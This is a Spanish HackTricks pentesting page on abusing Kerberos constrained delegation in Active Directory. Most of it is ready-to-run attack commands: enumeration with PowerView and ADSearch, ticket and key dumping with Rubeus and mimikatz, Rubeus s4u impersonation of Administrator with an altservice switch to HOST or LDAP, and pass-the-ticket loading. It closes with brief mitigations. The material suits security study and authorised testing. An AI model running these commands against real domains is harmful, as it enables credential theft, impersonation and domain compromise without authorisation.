## Delegación Restringida

Usando esto, un administrador de dominio puede permitir que una computadora se haga pasar por un usuario o computadora contra un servicio de una máquina.

* **Servicio para el usuario a sí mismo (**_**S4U2self**_**):** Si una cuenta de servicio tiene un valor _userAccountControl_ que contiene [TRUSTED\_TO\_AUTH\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) (T2A4D), entonces puede obtener un TGS para sí mismo (el servicio) en nombre de cualquier otro usuario.
* **Servicio para el usuario a través de proxy (**_**S4U2proxy**_**):** Una cuenta de servicio podría obtener un TGS en nombre de cualquier usuario para el servicio establecido en **msDS-AllowedToDelegateTo.** Para hacerlo, primero necesita un TGS de ese usuario para sí mismo, pero puede usar S4U2self para obtener ese TGS antes de solicitar el otro.

**Nota**: Si un usuario está marcado como '_Account is sensitive and cannot be delegated_ ' en AD, no podrás hacerse pasar por ellos.

Esto significa que si comprometes el hash del servicio, puedes hacerse pasar por usuarios y obtener acceso en su nombre al servicio configurado (posible **privesc**).

Además, no solo tendrás acceso al servicio que el usuario puede hacerse pasar, sino también a cualquier servicio, porque no se está comprobando el SPN (el nombre del servicio solicitado), solo los privilegios. Por lo tanto, si tienes acceso al servicio **CIFS**, también puedes tener acceso al servicio **HOST** usando la bandera `/altservice` en Rubeus.

Además, se necesita acceso al servicio **LDAP en DC** para explotar un **DCSync**.

{% code title="Enumerar" %}
```bash
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```
{% code title="Obtener TGT" %}
```bash
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
{% endcode %}

{% hint style="warning" %}
Existen **otras formas de obtener un ticket TGT** o el **RC4** o **AES256** sin ser SYSTEM en la computadora, como el Printer Bug y la delegación no restringida, el reenvío de NTLM y el abuso del servicio de certificados de Active Directory.

**Solo con tener ese ticket TGT (o su hash) puedes realizar este ataque sin comprometer toda la computadora.**
{% endhint %}

{% code title="Usando Rubeus" %}
```bash
#Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

#Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```
{% endcode %}

{% code title="kekeo + Mimikatz" %}

Kekeo es una herramienta que permite la creación de tickets Kerberos y la realización de ataques de Constrained Delegation. Mimikatz, por otro lado, es una herramienta que permite la extracción de credenciales de Windows. Juntos, pueden ser utilizados para realizar ataques de Constrained Delegation en entornos de Active Directory.

Para realizar un ataque de Constrained Delegation con kekeo y Mimikatz, primero se debe obtener acceso a una cuenta de usuario con permisos de Constrained Delegation. Luego, se puede utilizar kekeo para crear un ticket Kerberos para el servicio al que se desea acceder. Finalmente, se puede utilizar Mimikatz para extraer las credenciales del ticket Kerberos y utilizarlas para acceder al servicio.

Es importante tener en cuenta que este tipo de ataque puede ser detectado por soluciones de seguridad de Active Directory, por lo que se recomienda utilizarlo con precaución y solo en entornos controlados y autorizados.
```bash
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'  
```
### Mitigación

* Deshabilitar la delegación de Kerberos cuando sea posible.
* Limitar los inicios de sesión de DA/Admin a servicios específicos.
* Establecer "La cuenta es sensible y no se puede delegar" para las cuentas privilegiadas.

[**Más información en ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
